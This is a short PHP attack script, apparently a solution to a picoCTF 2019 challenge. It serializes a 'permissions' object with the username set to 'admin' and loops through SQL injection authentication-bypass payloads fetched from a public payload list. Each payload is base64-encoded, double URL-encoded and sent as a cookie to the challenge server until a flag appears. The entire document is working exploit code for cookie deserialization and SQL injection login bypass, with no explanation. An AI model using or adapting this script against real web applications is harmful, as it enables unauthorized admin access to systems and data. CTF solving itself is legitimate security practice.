<?php

class permissions{
	public $username = "guest";
	public $password = "guest";
}

$a = new Permissions();

$wordlist = explode("\n", file_get_contents("https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/Intruder/Auth_Bypass.txt"));

foreach ( $wordlist as $word ):

	$a->username = "admin";
	$a->password = $word;
	$ret = send(urlencode(urlencode(base64_encode(serialize($a)))));
	if ( $ret !== false ){
		preg_match("#Flag: (.*?)<#",$ret, $flag);
		echo "\rFlag : " . $flag[1] . "\n";
		break;
	}else{
		echo "\rTesting = " . $word;
	}

endforeach;

function send($payload){
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL,"http://2019shell1.picoctf.com:32256/index.php?file=admin");
	curl_setopt($ch, CURLOPT_COOKIE, 'user_info='.$payload);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	$server_output = curl_exec($ch);
	curl_close ($ch);
	return strstr($server_output, "You are not admin!") ? false : $server_output;
}
